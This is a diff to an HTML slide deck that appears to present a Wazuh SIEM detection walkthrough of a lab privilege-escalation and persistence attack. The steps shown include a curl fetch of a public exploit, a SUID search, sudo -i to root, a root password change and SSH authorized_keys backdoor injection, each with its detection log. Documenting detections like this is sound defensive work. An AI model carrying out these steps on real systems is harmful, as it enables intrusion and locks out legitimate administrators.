@@ -36,23 +36,36 @@
   .step-time{font-family:var(--mono);font-size:20px;color:var(--yellow);}
   .step-mitre{font-family:var(--mono);font-size:20px;color:var(--green);border:1px solid rgba(0,255,157,0.3);padding:2px 8px;border-radius:2px;}
 
-  /* SCROLL AREA - FIXED FOR SCROLLING */
+  /* SCROLL AREA - RESTORE GLOBAL SCROLL */
   .scroll-body{flex: 1 1 auto; overflow-y: auto; padding: 24px 32px 80px 32px; display: flex; flex-direction: column; gap: 28px; scrollbar-width: thin; scrollbar-color: var(--border) transparent;}
   .scroll-body::-webkit-scrollbar {width: 6px;}
   .scroll-body::-webkit-scrollbar-thumb {background: var(--border); border-radius: 3px;}
 
   /* LOG CARD */
-  .log-card{border:1px solid var(--border);border-radius:4px;background:#010c15;overflow:hidden;opacity:0;transform:translateY(16px);transition:opacity 0.5s,transform 0.5s;}
+  .log-card{border:1px solid var(--border);border-radius:4px;background:#010c15;overflow:hidden;opacity:0;transform:translateY(16px);transition:opacity 0.5s,transform 0.5s; display: flex; flex-direction: column; flex-shrink: 0;}
   .log-card.shown{opacity:1;transform:translateY(0);}
 
-  .card-label{display:flex;justify-content:space-between;align-items:center;padding:9px 18px;background:rgba(0,0,0,0.5);border-bottom:1px solid var(--border);}
+  .card-label{display:flex;justify-content:space-between;align-items:center;padding:9px 18px;background:rgba(0,0,0,0.5);border-bottom:1px solid var(--border); flex-shrink: 0;}
   .card-label-left{font-family:var(--mono);font-size:12px;color:var(--cyan);}
   .card-label-right{font-family:var(--mono);font-size:11px;color:var(--yellow);}
 
-  .card-img{width:100%;display:block;border-bottom:1px solid var(--border); image-rendering: -webkit-optimize-contrast;}
-  .card-img-placeholder{width:100%;min-height:120px;display:flex;align-items:center;justify-content:center;background:#010912;border-bottom:1px solid var(--border);font-family:var(--mono);font-size:18px;color:var(--dim);}
+  /* IMAGE SCROLL CONTAINER - USE AVAILABLE SPACE */
+  .card-img-container {
+    width: 100%;
+    max-height: 60vh; /* Expands to fill space, scrolls only if very long */
+    overflow-y: auto;
+    border-bottom: 1px solid var(--border);
+    background: #010912;
+    scrollbar-width: thin;
+    scrollbar-color: var(--cyan) transparent;
+  }
+  .card-img-container::-webkit-scrollbar {width: 4px;}
+  .card-img-container::-webkit-scrollbar-thumb {background: var(--cyan); border-radius: 2px;}
 
-  .card-desc{padding:18px 22px;font-family:var(--mono);font-size:18px;line-height:2;color:var(--text);}
+  .card-img{width:100%;display:block; image-rendering: -webkit-optimize-contrast;}
+  .card-img-placeholder{width:100%;min-height:120px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:18px;color:var(--dim);}
+
+  .card-desc{padding:18px 22px;font-family:var(--mono);font-size:18px;line-height:1.6;color:var(--text); flex-shrink: 0; background: #010c15;}
   .card-desc .key{color:var(--yellow);}
   .card-desc .val{color:var(--red);}
   .card-desc .ok {color:var(--green);}
@@ -93,8 +106,10 @@
         <span class="card-label-left">Auditd: Command execution — /usr/bin/curl</span>
         <span class="card-label-right">Rule #100001</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl.png" alt="curl command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: curl.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl.png" alt="curl command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: curl.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">21:53:32</span> — <span class="val">/usr/bin/curl</span><br>
         <span class="note">→ Attacker attempts to download an external tool.</span>
@@ -106,8 +121,10 @@
         <span class="card-label-left">Auditd: Arguments details — curl https://copy.fail/exp</span>
         <span class="card-label-right">auid=1000</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl-args.png" alt="curl args" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: curl-args.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl-args.png" alt="curl args" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: curl-args.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">Target</span> — <span class="val">https://copy.fail/exp</span><br>
         <span class="note">→ Attempted download of a public exploit. The action fails due to Azure network restrictions blocking unauthorized outbound connections.</span>
@@ -142,8 +159,10 @@
         <span class="card-label-left">Wazuh — su failure: PAM authentication denied</span>
         <span class="card-label-right">Rules 5503 / 5301</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/su/su-refused.png" alt="su failed" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: su-refused.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/su/su-refused.png" alt="su failed" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: su-refused.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">21:56:50</span> — <span class="val">PAM: User login failed</span> &nbsp;·&nbsp; <span class="val">User missed password to change UID</span><br>
         <span class="note">→ Attacker tries a direct approach with 'su'. Authentication fails immediately.</span>
@@ -155,8 +174,10 @@
         <span class="card-label-left">Auditd: Command execution — /usr/bin/uname</span>
         <span class="card-label-right">Rule #100001</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/uname/uname-r.png" alt="uname command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: uname-r.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/uname/uname-r.png" alt="uname command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: uname-r.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">21:57:48</span> — <span class="val">/usr/bin/uname -r</span><br>
         <span class="note">→ Kernel reconnaissance to identify potential known vulnerabilities.</span>
@@ -168,8 +189,10 @@
         <span class="card-label-left">Auditd: Command execution — /usr/bin/find (SUID Search)</span>
         <span class="card-label-right">Rule #100001</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/find/find(loking for suid).png" alt="find command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: find-suid.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/find/find(loking for suid).png" alt="find command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: find-suid.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">22:03:58</span> — <span class="val">find / -perm -u=s -type f</span><br>
         <span class="note">→ Searching for SUID binaries that execute with root privileges.</span>
@@ -204,8 +227,10 @@
         <span class="card-label-left">Sudo -l: Discovery of unlimited rights</span>
         <span class="card-label-right">NOPASSWD: ALL</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l result" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: sudo-l.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l result" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: sudo-l.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="note">→ Critical Discovery: User 'stt' is authorized to execute ALL commands as root without a password.</span>
       </div>
@@ -216,11 +241,153 @@
         <span class="card-label-left">Auditd: Execution of sudo -i — Transition to ROOT</span>
         <span class="card-label-right">EUID=0 (root)</span>
       </div>
-      <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
-      <div class="card-img-placeholder" style="display:none;">[ image: sudo-i.png ]</div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: sudo-i.png ]</div>
+      </div>
       <div class="card-desc">
         <span class="key">22:07:08</span> — <span class="val">sudo -i</span><br>
         <span class="note">→ Attacker obtains an interactive root shell. EUID switches to 0, confirming successful escalation.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 3: Step 10 - Root Access & Persistence -->
+<div class="slide" id="slide-3">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span>
+      <span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:11:39</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 10</span>
+    <span class="step-name">Root Access Confirmation & Persistence</span>
+    <span class="step-time">22:11:39</span>
+    <span class="step-mitre">T1098 · Account Manipulation</span>
+  </div>
+
+  <div class="scroll-body">
+    <div class="log-card" id="lc7">
+      <div class="card-label">
+        <span class="card-label-left">Wazuh — ROOT access confirmed</span>
+        <span class="card-label-right">Rules 5402 / 5501</span>
+      </div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/password change/root gained.png" alt="root gained" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: root-gained.png ]</div>
+      </div>
+      <div class="card-desc">
+        <span class="note">→ Wazuh generates alerts 5402 and 5501, confirming a successful root session has been opened.</span>
+      </div>
+    </div>
+
+    <div class="log-card" id="lc8">
+      <div class="card-label">
+        <span class="card-label-left">Auditd: Execution of /usr/bin/passwd</span>
+        <span class="card-label-right">Rule 5555</span>
+      </div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/password change/passwd.png" alt="password change" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: passwd.png ]</div>
+      </div>
+      <div class="card-desc">
+        <span class="key">22:11:39</span> — <span class="val">/usr/bin/passwd</span><br>
+        <span class="note">→ Ultimate persistence action: Attacker modifies the root password to secure long-term access and lock out legitimate administrators.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 4: Step 11 - Key Injection (FIM) -->
+<div class="slide" id="slide-4">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span>
+      <span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:17:01</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 11</span>
+    <span class="step-name">Permanent Persistence — SSH Key Injection</span>
+    <span class="step-time">22:17:01</span>
+    <span class="step-mitre">T1098.004 · SSH Authorized Keys</span>
+  </div>
+
+  <div class="scroll-body">
+    <div class="log-card" id="lc9">
+      <div class="card-label">
+        <span class="card-label-left">Wazuh FIM — /root/.ssh/authorized_keys modified</span>
+        <span class="card-label-right">Rule 550 (Integrity changed)</span>
+      </div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/backdoor/authrized_key_changed.png" alt="key injection" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: authrized_key_changed.png ]</div>
+      </div>
+      <div class="card-desc">
+        <span class="note">→ Wazuh's File Integrity Monitoring (FIM) detects the injection of the attacker's public key. File size increased from 261 to 356 bytes, indicating a new entry.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 5: Step 11 - Finalizing the Backdoor -->
+<div class="slide" id="slide-5">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span>
+      <span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>22:17:25 → 22:17:31</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 11</span>
+    <span class="step-name">Backdoor Finalization & Activation</span>
+    <span class="step-time">22:17:31</span>
+    <span class="step-mitre">T1098.004 · T1547.004</span>
+  </div>
+
+  <div class="scroll-body">
+    <div class="log-card" id="lc10">
+      <div class="card-label">
+        <span class="card-label-left">Auditd: Execution of chmod 600</span>
+        <span class="card-label-right">EUID=0</span>
+      </div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/chmod-of-authorized-key.png" alt="chmod 600" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: chmod-600.png ]</div>
+      </div>
+      <div class="card-desc">
+        <span class="note">→ Securing the backdoor: Setting restrictive permissions (600) on the authorized_keys file to comply with SSH daemon security requirements.</span>
+      </div>
+    </div>
+
+    <div class="log-card" id="lc11">
+      <div class="card-label">
+        <span class="card-label-left">Auditd: Execution of systemctl restart ssh</span>
+        <span class="card-label-right">EUID=0</span>
+      </div>
+      <div class="card-img-container">
+        <img class="card-img" src="../sketching/rstart ssh.png" alt="ssh restart" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+        <div class="card-img-placeholder" style="display:none;">[ image: rstart-ssh.png ]</div>
+      </div>
+      <div class="card-desc">
+        <span class="note">→ Restarting the SSH service to activate the backdoor. The attacker now has permanent, passwordless root access to the machine.</span>
       </div>
     </div>
   </div>
@@ -230,7 +397,7 @@
 <div class="nav-hint">← → / SPACE</div>
 
 <script>
-const TOTAL = 3;
+const TOTAL = 6;
 let cur = 0;
 
 function buildNav() {
@@ -273,6 +440,9 @@ function runAnim(n) {
   if (n === 0) { animCards(['lc0', 'lc1'], 150, 320); }
   if (n === 1) { animCards(['lc2', 'lc3', 'lc4'], 150, 320); }
   if (n === 2) { animCards(['lc5', 'lc6'], 150, 320); }
+  if (n === 3) { animCards(['lc7', 'lc8'], 150, 320); }
+  if (n === 4) { animCards(['lc9'], 150, 320); }
+  if (n === 5) { animCards(['lc10', 'lc11'], 150, 320); }
 }
 
 document.addEventListener('keydown', e => {
